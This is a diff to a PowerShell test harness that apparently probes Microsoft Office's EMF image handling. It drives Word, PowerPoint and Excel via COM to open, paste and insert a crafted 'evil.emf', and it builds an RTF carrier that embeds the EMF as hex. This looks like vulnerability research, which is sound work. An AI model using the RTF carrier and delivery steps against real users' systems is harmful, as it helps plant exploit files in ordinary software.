@@ -188,4 +188,23 @@ Probe "$root\EXCEL.EXE" @('/x') $xlsOpen 'xls_openpict'
 # PPT clipboard paste of EMF (slide = drawing surface)
 $pptPaste={ param($p) if(SetClipEmf 'C:\emfwork\evil.emf'){ try{ $a=[Runtime.InteropServices.Marshal]::GetActiveObject('PowerPoint.Application'); $pres=$a.Presentations.Add(0); $pres.Slides.Add(1,12)|Out-Null; Start-Sleep 2; try{ $pres.Slides.Item(1).Shapes.Paste()|Out-Null; Log '  ppt paste ok' }catch{ Log ('  ppt paste: ' + $_.Exception.Message) }; Start-Sleep 8; $pres.Saved=-1 }catch{ Log ("  com: " + $_.Exception.Message) } } }
 Probe "$root\POWERPNT.EXE" @('/w') $pptPaste 'ppt_paste'
+# evil RTF carrier (\pict\emfblip)
+$emfhex=[System.BitConverter]::ToString([System.IO.File]::ReadAllBytes('C:\emfwork\evil.emf')).Replace('-','').ToLower()
+$rtf='{\rtf1\ansi\deff0{\fonttbl{\f0 Calibri;}}\viewkind4\uc1\pard Picture:\par {\pict\emfblip\picwgoal2000\pichgoal2000 '+$emfhex+'}\par}'
+Set-Content -Path 'C:\emfwork\evil.rtf' -Value $rtf -Encoding ASCII
+Log ('evil.rtf written ' + (Get-Item 'C:\emfwork\evil.rtf').Length)
+$openRtf={ param($p) try{ $w=[Runtime.InteropServices.Marshal]::GetActiveObject('Word.Application'); $d=$w.Documents.Open('C:\emfwork\evil.rtf'); Start-Sleep 8; Log ('  rtf opened inlineshapes=' + $d.InlineShapes.Count); try{ $d.SaveAs2('C:\emfwork\evil_rtf.docx',16); Log '  rtf->docx save ok' }catch{ Log ('  save: ' + $_.Exception.Message) }; $d.Close(0); $w.Quit() }catch{ Log ('  com: ' + $_.Exception.Message) } }
+Probe "$root\WINWORD.EXE" @('/n','/q') $openRtf 'word_evilrtf'
+# Word copy+paste of the EMF picture (FCreateShapesFromCF candidate)
+$wordCopyPaste={ param($p) try{ $w=[Runtime.InteropServices.Marshal]::GetActiveObject('Word.Application'); $d=$w.Documents.Open('C:\emfwork\evil.docx'); Start-Sleep 6; try{ $d.InlineShapes.Item(1).Copy()|Out-Null; Log '  shape copied'; $r=$d.Range(); $r.Collapse(1); $r.Paste(); Log '  pasted'; Start-Sleep 8 }catch{ Log ('  copy/paste: ' + $_.Exception.Message) }; $d.Close(0); $w.Quit() }catch{ Log ('  com: ' + $_.Exception.Message) } }
+Probe "$root\WINWORD.EXE" @('/n','/q') $wordCopyPaste 'word_copypaste'
+# PPT copy+paste of the OLE icon picture
+$pptCopyPaste={ param($p) try{ $a=[Runtime.InteropServices.Marshal]::GetActiveObject('PowerPoint.Application'); $pres=$a.Presentations.Open('C:\emfwork\ole_evil.pptx',$true,$false,$true); Start-Sleep 6; try{ $pres.Slides.Item(1).Shapes.Item(1).Copy(); Log '  ppt shape copied'; Start-Sleep 2; $pres.Slides.Item(1).Shapes.Paste()|Out-Null; Log '  ppt pasted'; Start-Sleep 8 }catch{ Log ('  ppt cp: ' + $_.Exception.Message) }; $pres.Close(); $a.Quit() }catch{ Log ('  com: ' + $_.Exception.Message) } }
+Probe "$root\POWERPNT.EXE" @('/w') $pptCopyPaste 'ppt_copypaste'
+# Excel copy+paste of picture shape
+$xlsCopyPaste={ param($p) try{ $x=[Runtime.InteropServices.Marshal]::GetActiveObject('Excel.Application'); $wb=$x.Workbooks.Open('C:\emfwork\evil_pict.xls'); Start-Sleep 6; try{ $wb.Worksheets.Item(1).Shapes.Item(1).Copy(); Log '  xls shape copied'; Start-Sleep 2; $x.ActiveSheet.Paste(); Log '  xls pasted'; Start-Sleep 8 }catch{ Log ('  xls cp: ' + $_.Exception.Message) }; $wb.Saved=$true }catch{ Log ('  com: ' + $_.Exception.Message) } }
+Probe "$root\EXCEL.EXE" @('/x') $xlsCopyPaste 'xls_copypaste'
+# Word InlineShapes.AddPicture direct EMF
+$wordAddPic={ param($p) try{ $w=[Runtime.InteropServices.Marshal]::GetActiveObject('Word.Application'); $d=$w.Documents.Add(); try{ $d.InlineShapes.AddPicture('C:\emfwork\evil.emf')|Out-Null; Log '  wrd addpic ok'; Start-Sleep 8 }catch{ Log ('  wrd addpic: ' + $_.Exception.Message) }; $d.Close(0); $w.Quit() }catch{ Log ('  com: ' + $_.Exception.Message) } }
+Probe "$root\WINWORD.EXE" @('/n','/q') $wordAddPic 'word_addpic'
 Log '=== done ==='
